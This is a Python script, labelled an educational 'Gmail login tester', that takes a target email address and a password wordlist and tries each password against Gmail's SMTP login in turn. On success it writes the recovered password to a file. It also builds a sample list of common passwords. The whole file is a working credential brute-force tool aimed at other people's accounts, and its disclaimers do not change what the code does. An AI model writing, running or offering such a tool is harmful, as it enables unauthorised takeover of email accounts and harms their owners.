#!/usr/bin/env python3
import smtplib
import socket
import sys
import os
import time
from getpass import getpass

def test_gmail_login(email, password, timeout=10):
    """
    Test Gmail login credentials
    Returns: (success, message)
    """
    try:
        # Set socket timeout
        socket.setdefaulttimeout(timeout)
        
        # Connect to Gmail SMTP server
        smtp_server = smtplib.SMTP("smtp.gmail.com", 587, timeout=timeout)
        smtp_server.ehlo()
        smtp_server.starttls()
        smtp_server.ehlo()  # Re-identify after TLS
        
        # Attempt login
        smtp_server.login(email, password.strip())
        smtp_server.quit()
        
        return True, "Login successful!"
        
    except smtplib.SMTPAuthenticationError:
        return False, "Authentication failed - wrong password"
    except smtplib.SMTPException as e:
        return False, f"SMTP error: {str(e)}"
    except socket.timeout:
        return False, "Connection timeout"
    except socket.error as e:
        return False, f"Network error: {str(e)}"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"

def check_password_file(filename):
    """
    Check if password file exists and is readable
    """
    if not os.path.exists(filename):
        return False, f"File '{filename}' not found"
    
    if not os.path.isfile(filename):
        return False, f"'{filename}' is not a file"
    
    if not os.access(filename, os.R_OK):
        return False, f"'{filename}' is not readable"
    
    return True, "File is valid"

def main():
    print("=" * 50)
    print("GMAIL LOGIN TESTER (Educational Use Only)")
    print("=" * 50)
    print("\n⚠️  WARNING: This tool is for educational purposes only!")
    print("⚠️  Testing accounts without permission is illegal!")
    print("⚠️  Gmail has security measures that may lock accounts!")
    print("\n" + "=" * 50)
    
    # Get user input
    email = input("\nEnter target email address: ").strip()
    
    if not email or "@" not in email:
        print("❌ Invalid email address format!")
        sys.exit(1)
    
    password_file = input("Enter password list filename: ").strip()
    
    if not password_file:
        print("❌ No filename provided!")
        sys.exit(1)
    
    # Validate password file
    valid, message = check_password_file(password_file)
    if not valid:
        print(f"❌ {message}")
        sys.exit(1)
    
    print(f"\n📁 Using password list: {password_file}")
    print(f"📧 Testing against: {email}")
    print("\n🔄 Starting password testing...\n")
    
    # Read passwords
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = file.readlines()
    except Exception as e:
        print(f"❌ Error reading password file: {str(e)}")
        sys.exit(1)
    
    if not passwords:
        print("❌ Password file is empty!")
        sys.exit(1)
    
    print(f"📊 Loaded {len(passwords)} passwords to test\n")
    
    # Test each password
    tested = 0
    start_time = time.time()
    
    for password in passwords:
        tested += 1
        password = password.strip()
        
        if not password:  # Skip empty lines
            continue
            
        # Show progress
        print(f"[{tested}/{len(passwords)}] Testing: {password[:5]}{'*' * (len(password)-5)}", end=" ... ")
        
        # Test the password
        success, message = test_gmail_login(email, password)
        
        if success:
            print("\n" + "=" * 50)
            print(f"✅ SUCCESS! Password found: {password}")
            print("=" * 50)
            
            # Save result to file
            with open("found_password.txt", "w") as result_file:
                result_file.write(f"Email: {email}\n")
                result_file.write(f"Password: {password}\n")
                result_file.write(f"Time: {time.ctime()}\n")
            print(f"📝 Result saved to 'found_password.txt'")
            break
        else:
            print(f"❌ Failed - {message}")
        
        # Small delay to avoid rate limiting
        time.sleep(0.5)
    
    # Summary
    elapsed_time = time.time() - start_time
    print("\n" + "=" * 50)
    print("TEST COMPLETED")
    print("=" * 50)
    print(f"📊 Total passwords tested: {tested}")
    print(f"⏱️  Time elapsed: {elapsed_time:.2f} seconds")
    
    if not success:
        print("\n❌ No valid password found in the list!")
        print("\n💡 Tips:")
        print("   - Gmail has strong security and rate limiting")
        print("   - Account may have 2FA enabled")
        print("   - Gmail might require App Password instead of regular password")
        print("   - Consider legal and ethical implications")

def create_sample_password_file():
    """
    Create a sample password file for testing
    """
    sample_passwords = [
        "password123",
        "123456",
        "qwerty",
        "letmein",
        "admin",
        "welcome",
        "monkey",
        "dragon",
        "master",
        "football"
    ]
    
    filename = "sample_passwords.txt"
    with open(filename, "w") as f:
        for pwd in sample_passwords:
            f.write(pwd + "\n")
    
    print(f"✅ Created sample password file: {filename}")
    return filename

if __name__ == "__main__":
    try:
        # Check if user wants to create a sample file
        if len(sys.argv) > 1 and sys.argv[1] == "--create-sample":
            create_sample_password_file()
        else:
            main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Critical error: {str(e)}")
        sys.exit(1)
